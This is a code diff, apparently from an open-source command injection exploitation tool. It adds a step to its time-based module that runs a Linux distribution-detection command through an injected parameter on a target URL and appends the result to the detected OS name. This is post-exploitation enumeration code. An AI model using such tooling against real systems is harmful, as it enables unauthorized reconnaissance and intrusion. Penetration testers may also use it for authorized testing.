@@ -100,6 +100,7 @@ def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, 
     settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
   cmd = settings.RECOGNISE_OS        
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
+    # The main command injection exploitation.
     check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
     session_handler.store_cmd(url, cmd, output, vuln_parameter)
     new_line = "\n"
@@ -110,6 +111,20 @@ def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, 
   if target_os:
     if new_line == "\n":
       print ""
+    if settings.TARGET_OS != "win":
+      cmd = settings.DISTRO_INFO
+      if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
+        check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
+        session_handler.store_cmd(url, cmd, output, vuln_parameter)
+        new_line = "\n"
+      else:
+        output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
+        new_line = ""
+      distro_name = output
+      if len(distro_name) != 0:
+          target_os = target_os + " (" + distro_name + ")"
+      if new_line == "\n":
+        print ""     
     if settings.TARGET_OS == "win":
       cmd = settings.WIN_RECOGNISE_HP
     else:
